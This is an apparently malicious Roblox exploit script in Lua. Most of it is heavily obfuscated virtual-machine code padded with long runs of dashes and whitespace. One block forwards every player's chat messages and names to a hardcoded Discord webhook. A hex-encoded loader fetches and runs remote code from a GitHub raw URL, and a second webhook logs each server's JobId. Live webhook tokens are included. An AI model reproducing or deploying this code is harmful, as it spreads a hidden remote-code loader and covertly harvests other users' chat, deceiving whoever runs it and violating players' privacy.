+ 402);break;end if ((3053<=4816) and ((0 + 0)==v331)) then v156=v85[2 + (0 -0)];v157=v83[v156];v331=3 -2;end end end end break;end end end if (((1601 + 3046)>=559) and (v155==(1 -0))) then v158=v85[11 -8];for v297=1,v158 do v157[v297]=v83[v156 + v297];end break;end end break;end if ((v154==(1490 -(87 + 312 + 1090))) or (1188==(2415 + 2182))) then local v244=0 + (585 -(562 + 23));while true do if (((21683 -17031)>(3367 + 363)) and (v244==(0 + 0))) then v157=nil;v158=nil;v244=1;end if ((v244==1) or ((778 -(58 + 141))>1817)) then v154=386 -(309 + 75);break;end end end if (((2866 + 1519)>=1771) and (0==v154)) then local v245=0 + 0 + 0;while true do if (((1532 -(627 + 7))==(1428 -(486 + 44))) and (v245==0)) then v155=1823 -(1423 + 400);v156=nil;v245=1 + 0;end if ((v245==1) or (((8998 -5879) -(21 + (964 -377)))<(221 + 909 + 683))) then v154=427 -(235 + 191);break;end end end end break;end if ((v153==(1 + 0)) or (3707<(495 + 6))) then v156=nil;v157=nil;v153=2 -0;end end elseif (((10969 -7662)>(1737 -(1216 + 310))) and (v86==44)) then v83[v85[2 + 0]][v85[1 + 2]]=v85[1843 -(1144 + 695)];else local v223=591 -(98 + 493);local v224;local v225;while true do if (((7103 -2249)==(6367 -(993 + 520))) and (v223==((2 -1) + 0))) then while true do if ((v224==0) or ((280 -(20 + 34))==(1949 -(408 + 27)))) then v225=v85[2];v83[v225]=v83[v225](v12(v83,v225 + (1 -0),v68));break;end end break;end if ((v223==0) or (((13207 + 10771) -19002)<=(3323 -(499 + 7)))) then v224=0 + 0;v225=nil;v223=1 + 0 + 0;end end end v67=v67 + 1;break;end if (((9409 -4427)>=(11820 -8655)) and (v90==(165 -(92 + 73)))) then local v101=0 + 0;while true do if ((603<(2397 + 492)) and (v101==0)) then v85=v76[v67];v86=v85[1944 -(1036 + 907)];v101=261 -(6 + 254);end if ((1==v101) or ((2413 -(24 + 583))>=4307)) then v90=1 -0;break;end end end end end end A,B=v27(v10(v71));if  not A[1] then local v87=0;local v88;while true do if (v87==0) then v88=v34[4][v67] or "?";error("Script error at ["   .. v88   .. "]:"   .. A[2]);break;end end else return v12(A,2,B);end end;end return v29(v28(),{},v16)();end if (v17==4) then v27=nil;function v27(...)return {...},v11("#",...);end v28=nil;function v28()local v55=451 -(228 + 223);local v56;local v57;local v58;local v59;local v60;local v61;local v62;while true do if (v55==(0 -0)) then v56=434 -(32 + 402);v57=nil;v55=1 + 0;end if (v55~=3) then else v62=nil;while true do if (v56==2) then local v91=0;local v92;while true do if (v91~=(1898 -(766 + 1132))) then else v92=0;while true do if (v92==(889 -(372 + 517))) then for v106=4 -3,v23() do local v107=0 + 0;local v108;local v109;while true do if (v107==1) then while true do if (v108==0) then v109=v21();if (v20(v109,1,1)~=(0 + 0)) then else local v229=0 -0;local v230;local v231;local v232;while true do if ((986 -(8 + 978))==v229) then local v246=945 -(170 + 775);while true do if (v246==(4 -3)) then v229=1478 -(1370 + 107);break;end if (v246~=0) then else v230=v20(v109,80 -(41 + 37),367 -(38 + 326));v231=v20(v109,4,6);v246=1;end end end if (v229==(1 -0)) then v232={v22(),v22(),nil,nil};if (v230==(0 -0)) then local v280=0;local v281;local v282;while true do if (v280==1) then while true do if (v281==0) then v282=0;while true do if (v282==(1602 -(14 + 1588))) then v232[3]=v22();v232[2 + 2]=v22();break;end end break;end end break;end if (v280==(1820 -(1506 + 314))) then v281=0;v282=nil;v280=1 -0;end end elseif (v230==(1 + 0)) then v232[985 -(815 + 167)]=v23();elseif (v230==2) then v232[8 -5]=v23() -((2 + 0)^(895 -(158 + 721)));elseif (v230~=(1061 -(486 + 572))) then else local v323=0 + 0;local v324;while true do if (v323==0) then v324=0 -0;while true do if (v324==(0 + 0)) then v232[3]=v23() -((135 -(51 + 82))^(32 -16));v232[4]=v22();break;end end break;end end end v229=2;end if (v229==(1 + 1)) then local v247=1184 -(634 + 550);local v248;while true do if (v247~=0) then else v248=0;while true do if (v248==(1 + 0)) then v229=3;break;end if (v248~=(0 -0)) then else if (v20(v231,1,1 -0)~=(2 -1)) then else v232[1013 -(37 + 974)]=v62[v232[3 -1]];end if (v20(v231,2,2)==1) then v232[161 -(70 + 88)]=v62[v232[3]];end v248=1;end end break;end end end if (v229==(3 + 0)) then if (v20(v231,1768 -(1115 + 650),1371 -(367 + 1001))~=1) then else v232[15 -11]=v62[v232[4]];end v57[v106]=v232;break;end end end break;end end break;end if (v107==(0 -0)) then local v113=0 -0;while true do if (v113==(0 -0)) then v108=0;v109=nil;v113=4 -3;end if (v113~=(1 -0)) then else v107=1938 -(690 + 1247);break;end end end end end for v110=1,v23() do v58[v110-1]=v28();end v92=1 + 0;end if (v92~=(1370 -(137 + 1232))) then else local v102=354 -(59 + 295);while true do if (v102==0) then for v114=4 -3,v23() do v59[v114]=v23();end return v60;end end end end break;end end end if (v56~=(1 + 0)) then else local v93=0 + 0;local v94;while true do if (v93==0) then v94=1471 -(786 + 685);while true do if (v94~=(3 -2)) then else local v103=0;while true do if (v103~=(315 -(174 + 141))) then else for v116=1 -0,v61 do local v117=0;local v118;local v119;local v120;while true do if (0==v117) then local v159=0;while true do if (v159==0) then v118=1558 -(859 + 699);v119=nil;v159=389 -(348 + 40);end if (v159~=1) then else v117=1092 -(536 + 555);break;end end end if (v117~=1) then else v120=nil;while true do if (v118==1) then if (v119==1) then v120=v21()~=0;elseif (v119==2) then v120=v24();elseif (v119==3) then v120=v25();end v62[v116]=v120;break;end if (v118==0) then local v235=0;local v236;while true do if (v235~=0) then else v236=422 -(172 + 250);while true do if (v236==1) then v118=1 + 0;break;end if (0~=v236) then else local v300=0 + 0;while true do if (v300==0) then v119=v21();v120=nil;v300=2 -1;end if ((3 -2)~=v300) then else v236=1;break;end end end end break;end end end end break;end end end v60[6 -3]=v21();v103=1 + 0;end if ((759 -(116 + 642))~=v103) then else v94=2;break;end end end if (v94==(2 + 0)) then v56=1 + 1;break;end if (0==v94) then v61=v23();v62={};v94=4 -3;end end break;end end end if (v56~=0) then else local v95=0 + 0;local v96;while true do if (v95~=(1986 -(1652 + 334))) then else v96=0;while true do if (v96==0) then local v104=1909 -(204 + 1705);while true do if (v104~=(0 + 0)) then else v57={};v58={};v104=1;end if (v104==1) then v96=1;break;end end end if (v96~=(4 -2)) then else v56=1142 -(965 + 176);break;end if (v96==(984 -(288 + 695))) then local v105=0;while true do if (v105~=(1136 -(730 + 406))) then else v59={};v60={v57,v58,nil,v59};v105=1;end if (v105~=1) then else v96=5 -3;break;end end end end break;end end end end break;end if (v55~=1) then else v58=nil;v59=nil;v55=1724 -(1575 + 147);end if (v55==2) then v60=nil;v61=nil;v55=3;end end end v17=5;end if (0==v17) then v18=1;v19=nil;v15=v4(v3(v15,5),"..",function(v37)if (v1(v37,2)==79) then v19=v0(v3(v37,1,1));return "";else local v72=0;local v73;while true do if (0==v72) then v73=v2(v0(v37,16));if v19 then local v99=0;local v100;while true do if (v99==1) then return v100;end if (v99==0) then v100=v5(v73,v19);v19=nil;v99=1;end end else return v73;end break;end end end end);v20=nil;v17=1;end end end vv8());end
print("(SA)")
--
--
--
---
---
---

------

----


---------------------
---


------
--


----------------


----------------------------------

-----
-----------
-------------------------


-----------
------------------

-----

----------------------------------------------------------






------------------------------------------------
















---------------------------------------























---------------------------------------









































































































































































































































































































































































































































































local marketplaceService = game:GetService("MarketplaceService")
 
local isSuccessful, info = pcall(marketplaceService.GetProductInfo, marketplaceService, Game.PlaceId)
if isSuccessful then
 
local wh = 'https://discord.com/api/webhooks/1015029355132497950/ybmdAUGu0_-9FBvuGbL_KFUo8zUXWtBhoxJysAE_s_wFrUOFFZDGTonK-DDKx0hVEAvu'
local embed1 = {
       ['title'] = 'Beginning of Message logs on '..info.Name.." at "..tostring(os.date("%m/%d/%y at time %X"))
   }
local a = syn.request({
   Url = wh,
   Headers = {['Content-Type'] = 'application/json'},
   Body = game:GetService("HttpService"):JSONEncode({['embeds'] = {embed1}, ['content'] = ''}),
   Method = "POST"
})
function logMsg(Webhook, Player, Message)
   local embed = {
       ['description'] = Player..": "..Message.."  " ..tostring(os.date("| time %X")) 
   }
   local a = syn.request({
       Url = Webhook,
       Headers = {['Content-Type'] = 'application/json'},
       Body = game:GetService("HttpService"):JSONEncode({['embeds'] = {embed}, ['content'] = ''}),
       Method = "POST"
   })
end
for i,v in pairs(game.Players:GetPlayers()) do
   v.Chatted:Connect(function(msg)
       logMsg(wh, v.Name, msg)
   end)
end
 
game.Players.PlayerAdded:Connect(function(plr)
   plr.Chatted:Connect(function(msg)
       logMsg(wh, plr.Name, msg)
   end)
end)
end

do local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=getfenv or function()return _ENV;end;local v9=setmetatable;local v10=pcall;local v11=select;local v12=unpack or table.unpack;local v13=tonumber;local function v14(v15,v16)local v17=0;local v18;local v19;local v20;local v21;local v22;local v23;local v24;local v25;local v26;local v27;local v28;local v29;while true do if (v17==3) then function v24()local v38=v23();local v39=v23();return (( -(1 + 1 + 0) * v20(v39,1194 -(931 + 231))) + 1) * ((3 -1)^(v20(v39,12 + (20 -11),1575 -(1308 + 236)) -1023)) * ((((v20(v39,1,1 + 19) * ((2 + (0 -0))^(18 + 14 + 0))) + v38)/((1858 -(1629 + 85 + 142))^(181 -129))) + 1 + 0 + 0);end v25=nil;function v25(v30)local v40=0 + (139 -(98 + 41));local v41;local v42;while true do if (v40==(2 -0)) then v42={};for v69=1 + 0 + 0, #v41 do v42[v69]=v2(v1(v3(v41,v69,v69)));end v40=3 + 0;end if (v40==(0 + 0)) then v41=nil;if  not v30 then local v72=0 + 0;while true do if (0==v72) then v30=v23();if (v30==(569 -(28 + 541))) then return "";end break;end end end v40=1;end if (v40==(1 + 0)) then v41=v3(v15,v18,(v18 + v30) -((843 + 1059) -(1040 + (1375 -514))));v18=v18 + v30;v40=2;end if ((127 -(29 + 29 + 66))==v40) then return v6(v42);end end end v26=v23;v17=4;end if (v17==4) then v27=nil;function v27(...)return {...},v11("#",...);end v28=nil;function v28()local v43=0;local v44;local v45;local v46;local v47;local v48;local v49;local v50;local v51;while true do if (v43~=2) then else v48=nil;v49=nil;v43=3 + 0;end if (v43==(940 -(766 + 171))) then v50=nil;v51=nil;v43=4;end if (0==v43) then v44=760 -(734 + 26);v45=nil;v43=2 -1;end if ((1946 -(1351 + 591))==v43) then while true do if (v44~=2) then else v49=nil;v50=nil;v44=1242 -(682 + 557);end if (v44~=(1691 -(1196 + 494))) then else v47=nil;v48=nil;v44=2 + 0;end if (0==v44) then v45=0;v46=nil;v44=1;end if (3==v44) then v51=nil;while true do local v78=0 + 0;while true do if (v78~=0) then else if ((1 + 0)~=v45) then else local v96=0;while true do if ((1 + 0)==v96) then for v105=1,v50 do local v106=0;local v107;local v108;local v109;local v110;while true do if (v106~=2) then else while true do if (v107==1) then v110=nil;while true do if (v108~=0) then else local v137=1984 -(507 + 1477);while true do if (v137==1) then v108=838 -(129 + 708);break;end if ((0 + 0)==v137) then v109=v21();v110=nil;v137=1;end end end if (v108~=(1192 -(359 + 832))) then else if (v109==1) then v110=v21()~=0;elseif (v109==(1 + 1)) then v110=v24();elseif (v109==3) then v110=v25();end v51[v105]=v110;break;end end break;end if (v107==(0 -0)) then local v135=1887 -(636 + 1251);while true do if (v135~=0) then else v108=1366 -(608 + 758);v109=nil;v135=2 -1;end if (1~=v135) then else v107=1 + 0;break;end end end end break;end if (v106==(1 -0)) then v109=nil;v110=nil;v106=32 -(21 + 9);end if (v106==(1014 -(741 + 273))) then v107=1887 -(448 + 1439);v108=nil;v106=1 + 0;end end end v49[3]=v21();v96=2 -0;end if (v96==(534 -(447 + 87))) then v50=v23();v51={};v96=1960 -(1382 + 577);end if (v96==(2 + 0)) then v45=2;break;end end end if (v45~=0) then else local v97=0;while true do if (v97==(1965 -(1677 + 287))) then v48={};v49={v46,v47,nil,v48};v97=1 + 1;end if (v97~=0) then else v46={};v47={};v97=1;end if (v97==2) then v45=1;break;end end end v78=3 -2;end if (v78~=1) then else if (v45~=(3 -1)) then else local v98=0;local v99;while true do if ((0 -0)==v98) then v99=0 + 0;while true do local v111=0 -0;while true do if (v111~=(0 + 0)) then else if (v99==(1799 -(454 + 1344))) then local v125=0;while true do if (v125~=(0 + 0)) then else for v139=3 -2,v23() do v48[v139]=v23();end return v49;end end end if (v99~=(0 + 0)) then else local v126=62 -(14 + 48);while true do if (v126~=(749 -(605 + 143))) then else v99=1;break;end if ((0 -0)~=v126) then else for v141=845 -(680 + 164),v23() do local v142=0 + 0;local v143;local v144;while true do if (v142==(1455 -(1084 + 370))) then while true do if ((0 + 0)==v143) then v144=v21();if (v20(v144,1 + 0,2 -1)==(953 -(474 + 479))) then local v149=1019 -(388 + 631);local v150;local v151;local v152;local v153;while true do if (v149~=2) then else while true do if (v150==1) then local v154=0 + 0;while true do if ((0 -0)~=v154) then else v153={v22(),v22(),nil,nil};if (v151==(0 -0)) then local v160=0 + 0;while true do if (v160==0) then v153[14 -11]=v22();v153[1469 -(965 + 500)]=v22();break;end end elseif (v151==1) then v153[3]=v23();elseif (v151==2) then v153[3]=v23() -(2^(45 -29));elseif (v151==(4 -1)) then local v165=653 -(529 + 124);local v166;while true do if (0~=v165) then else v166=0;while true do if (v166==0) then v153[3]=v23() -((2 + 0)^16);v153[4]=v22();break;end end break;end end end v154=1 -0;end if (1~=v154) then else v150=1 + 1;break;end end end if (v150==(688 -(297 + 389))) then if (v20(v152,1,323 -(81 + 241))~=(1 + 0)) then else v153[740 -(192 + 546)]=v51[v153[2]];end if (v20(v152,2,2)~=(1 + 0)) then else v153[1160 -(1041 + 116)]=v51[v153[1216 -(919 + 294)]];end v150=3 + 0;end if (v150~=(557 -(215 + 339))) then else if (v20(v152,11 -8,3)==1) then v153[4]=v51[v153[4]];end v46[v141]=v153;break;end if ((0 + 0)~=v150) then else local v156=0 -0;while true do if (v156~=0) then else v151=v20(v144,2,3);v152=v20(v144,1 + 3,783 -(94 + 683));v156=621 -(81 + 539);end if (v156~=1) then else v150=1;break;end end end end break;end if (0==v149) then v150=0 + 0;v151=nil;v149=1 + 0;end if (1==v149) then v152=nil;v153=nil;v149=3 -1;end end end break;end end break;end if (v142==(0 + 0)) then v143=0;v144=nil;v142=1;end end end for v145=3 -2,v23() do v47[v145-1]=v28();end v126=1;end end end break;end end end break;end end end break;end end end break;end end break;end if (v43~=1) then else v46=nil;v47=nil;v43=2;end end end v17=5;end if (v17==1) then function v20(v31,v32,v33)if v33 then local v65=(0 + 0) -0;local v66;while true do if (v65==(0 -0)) then v66=(v31/((5 -3)^(v32-(2 -1))))%((610 -(146 + 462))^(((v33-((766 -(92 + 64)) -(111 + 498))) -(v32-(1 + 0))) + 1));return v66-(v66%(1 -0));end end else local v67=(67 -(47 + 18))^(v32-(1 -(1106 -(543 + 563))));return (((v31%(v67 + v67))>=v67) and (1182 -(473 + 708))) or ((1273 + 489) -(1032 + 730));end end v21=nil;function v21()local v52=539 -(382 + 157);local v53;while true do if (v52==(1 -0)) then return v53;end if (v52==(0 -0)) then v53=v1(v15,v18,v18);v18=v18 + 1 + 0;v52=1585 -(1088 + (773 -277));end end end v22=nil;v17=2;end if (v17==2) then function v22()local v54=0;local v55;local v56;while true do if (v54==(0 -(569 -(215 + 354)))) then v55,v56=v1(v15,v18,v18 + 2 + 0);v18=v18 + 2 + 0;v54=1 + 0;end if (v54==(1 + 0)) then return (v56 * ((1230 -(248 + 12)) -714)) + v55;end end end v23=nil;function v23()local v57,v58,v59,v60=v1(v15,v18,v18 + (1214 -(803 + 408)));v18=v18 + 1 + 3;return (v60 * (83211070 -66433854)) + (v59 * 65536) + (v58 * 256) + v57;end v24=nil;v17=3;end if (v17==0) then v18=1;v19=nil;v15=v4(v3(v15,5),"..",function(v34)if (v1(v34,2)==79) then v19=v0(v3(v34,1,1));return "";else local v68=v2(v0(v34,16));if v19 then local v71=v5(v68,v19);v19=nil;return v71;else return v68;end end end);v20=nil;v17=1;end if (v17==5) then v29=nil;function v29(v35,v36,v37)local v61=0;local v62;local v63;local v64;while true do if (1==v61) then v64=v35[3];return function(...)local v73=1;local v74= -1;local v75={...};local v76=v11("#",...) -1;local function v77()local v79=v62;local v80=Const;local v81=v63;local v82=v64;local v83=v27;local v84={};local v85={};local v86={};for v92=1329 -(54 + 1275),v76 do if (((2958 -(1606 + 122))==(2262 -(983 + 49))) and (v92>=v82)) then v84[v92-v82]=v75[v92 + 1 + 0];else v86[v92]=v75[v92 + (2 -1) + (0 -0)];end end local v87=(v76-v82) + (2 -1);local v88;local v89;while true do local v93=(1790 -(1731 + 59)) -0;while true do if ((v93==0) or (((1448 -(81 + 35)) -(25 + 133 + 815))==(1405 + 2667))) then v88=v79[v73];v89=v88[(477 -(108 + 367)) -1];v93=1 -0;end if ((v93==((1004 -(727 + 276)) + 0)) or ((3016 -(50 + (1568 -(51 + 694))))>=(5194 -(740 + 182)))) then if ((v89<=(1 + 1)) or ((2153 -(528 + 168))<=(1719 -966))) then if (((8563 -(8043 -3785))>=(4293 -((1023 -199) + 417))) and (v89<=(0 -0))) then local v101=0 + 0;local v102;local v103;local v104;while true do if ((v101==(204 -(120 + 84))) or ((2036 -1188)>(12977 -(10664 -(545 + 944))))) then local v122=0 + 0;while true do if ((v122==(0 -0)) or ((18677 -14260)<=(2738 -1577))) then v102=0 + 0;v103=nil;v122=1 + 0;end if (((1708 -(117 + 89 + (8 -3)))>(3844 -2821)) and (v122==(1 + 0))) then v101=(3720 -1781) -(1180 + 55 + 703);break;end end end if ((v101==(1 -(0 + 0))) or ((1985 -(150 + 1350))>=((30271 -17397) -8289))) then v104=nil;while true do if ((v102==(0 -0)) or ((4797 -2488)<(2038 + 149))) then local v127=0 -0;local v128;while true do if (((4839 -(740 + 128))>=(5070 -1522)) and ((0 + 0)==v127)) then v128=(342 + 922) -(99 + (2432 -(33 + 1234)));while true do if ((v128==(1586 -(309 + 1277))) or ((5146 -(28 + 921))<(1126 + 2786))) then local v147=0 + 0;while true do if (((851 + 130 + 160)>=(1272 -(147 + 116 + 222 + 185))) and (v147==((794 -(738 + 56)) + 0))) then v103=v88[644 -((1162 -(695 + 348)) + 523)];v104=v86[v88[10 -7]];v147=1 + 0;end if (((5506 -2161)>(2015 -(1764 -803))) and (v147==(1136 -(1030 + 105)))) then v128=(11 -7) -3;break;end end end if ((v128==((3 -2) + 0)) or (((705 + 1255) -((1737 -(215 + 1474)) + 317))<(4101 -(6005 -2935)))) then v102=796 -(691 + 104);break;end end break;end end end if ((v102==(2 -1)) or ((9481 -5180)<(965 + 1709))) then v86[v103 + 1]=v104;v86[v103]=v104[v88[912 -((55 -20) + (1694 -(312 + 509)))]];break;end end break;end end elseif ((v89>(3 -2)) or ((423 + (454 -266))==(2406 -(258 + 658)))) then v86[v88[(425 -(51 + 369)) -3]]=v37[v88[2 + 1]];else local v113=761 -(558 + 63 + 140);local v114;local v115;while true do if (((300 + 231)<=(4272 -(411 + 1007))) and (v113==((960 -664) -(280 + 16)))) then v114=0 -0;v115=nil;v113=1 + 0;end if (((2380 -((1621 -1225) + 291))>=(2706 -((1749 -1112) + 368 + 626))) and (((903 -(572 + 330)) -0)==v113)) then while true do if ((v114==(0 + (0 -0))) or ((1143 + 2993)<(7365 -4325))) then v115=v88[1877 -(1346 + 529)];v86[v115]=v86[v115](v12(v86,v115 + 1 + 0 + 0,v74));break;end end break;end end end elseif ((v89<=(1 + 3 + 0)) or ((2405 + 381)<=(146 + 322))) then if ((((6236 -3544) -(436 + 1014))==(4752 -3510)) and (v89==(5 -2))) then v86[v88[2]]();else v86[v88[4 -2]]=v88[(3409 -(158 + 1648)) -(186 + 222 + 1192)];end elseif ((v89>(1335 -(1107 + 223))) or ((15378 -10965)<(260 -107))) then do return;end else local v117=1721 -(941 + 780);local v118;local v119;local v120;local v121;while true do if ((v117==(1 + 0)) or ((9180 -5979)>((32179 -17239) -11319))) then local v123=(2977 -2156) -(227 + 594);while true do if ((v123==(0 -0)) or ((637 + 257)<(1811 -1413))) then v74=(v120 + v118) -(1 + 0);v121=0 + 0;v123=1 + (0 -0);end if ((v123==((2045 -951) -((1382 -(334 + 795)) + 840))) or ((3317 -(759 + 114))>(12766 -9544))) then v117=238 -(31 + 205);break;end end end if ((v117==((229 -123) -(72 + 34))) or ((8149 -(356 + 4749))>=(2880 + 217))) then local v124=1511 -(214 + 1297);while true do if (((1 + 8)==(1 + 7 + 1)) and ((1736 -(1337 + 398))==v124)) then v117=1;break;end if ((1602<(8942 -4507)) and (((1343 -(824 + 519)) + (157 -(141 + 16)))==v124)) then v118=v88[1 + 1];v119,v120=v83(v86[v118](v12(v86,v118 + (2 -1),v88[(1353 -(385 + 136)) -(389 + 440)])));v124=(3697 -2058) -(1448 + (717 -(336 + 191)));end end end if ((v117==(1 + 1)) or ((9547 -(565 + 6124))>(10996 -7113))) then for v131=v118,v74 do local v132=(0 -0) -0;local v133;local v134;while true do if (((1 + 0)==v132) or ((1034 + 1835)<=(1206 + 636))) then while true do if ((((2204 -935) + (986 -(204 + 763)))==(931 + 357)) and (v133==(0 -0))) then v134=(2030 -1317) -(630 + 83);while true do if ((v134==((797 -(753 + 44)) + 0)) or ((1018 -(532 -(27 + 14)))>(5712 -(475 + (2025 -1226))))) then v121=v121 + (1683 -(95 + 1387 + 200));v86[v131]=v119[v121];break;end end break;end end break;end if ((v132==(1798 -(914 + 884))) or ((848 + 2692)==(2946 -(279 + 113)))) then v133=0 + 0;v134=nil;v132=1;end end end break;end end end v73=v73 + (902 -(506 + 395));break;end end end end A,B=v27(v10(v77));if  not A[1] then local v90=0;local v91;while true do if (v90==0) then v91=v35[4][v73] or "?";error("Script error at ["   .. v91   .. "]:"   .. A[2]);break;end end else return v12(A,2,B);end end;end if (v61==0) then v62=v35[1];v63=v35[2];v61=1;end end end return v29(v28(),{},v16)();end end end v14("LOL!043O00030A3O006C6F6164737472696E6703043O0067616D6503073O00482O747047657403513O00682O7470733A2O2F7261772E67697468756275736572636F6E74656E742E636F6D2F53692O6E65727833466C6F72656E6369612F53692O6E65727833466C6F72656E6369612F6D61696E2F6O7700083O0012023O00013O001202000100023O00202O000100010003001204000300044O0005000100034O00015O00022O00033O000100012O00063O00017O00083O00023O00023O00023O00023O00023O00023O00023O00033O00",v8());end


local OSTime = os.time();
local Time = os.date('!*t', OSTime);
local Avatar = 'https://cdn.discordapp.com/embed/avatars/4.png';
local Content = 'Security Logger';
local Embed = {
    title = 'Executor Log:';
    color = '99999';
    footer = { text = game.JobId };
    author = {
        name = 'ROBLOX';
        url = 'https://www.roblox.com/';
    };
    fields = {
        {
            name = '(SA)';
            value = 'Owned By (SA)';
        }
    };
    timestamp = string.format('%d-%d-%dT%02d:%02d:%02dZ', Time.year, Time.month, Time.day, Time.hour, Time.min, Time.sec);
};
(syn and syn.request or http_request) {
    Url = 'https://discord.com/api/webhooks/1013726823512813668/hpKSdbjuf0_tTsRjDy5gllQ0XKqjpsa1AstXEWXhxaTw2rcuLH64b5Pt7lQpESwpA9pR';
    Method = 'POST';
    Headers = {
        ['Content-Type'] = 'application/json';
    };
    Body = game:GetService'HttpService':JSONEncode( { content = Content; embeds = { Embed } } );
};

















                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                   
                                                                                                                                                                                                                                                                                     
                                                                                                                                                                                                                                                                         
                                                                                                                                                                                                                                                                         
                                                                                                                                                                                                                                                                         
                                                                                                                                                                                                                                                                         
                                                                                                                                                                                                                                                                         
                                                                                                                                                                                                                                                                         
                                                                                                                                                                                                                                                                        
                                                                                                                                                                                                                                              
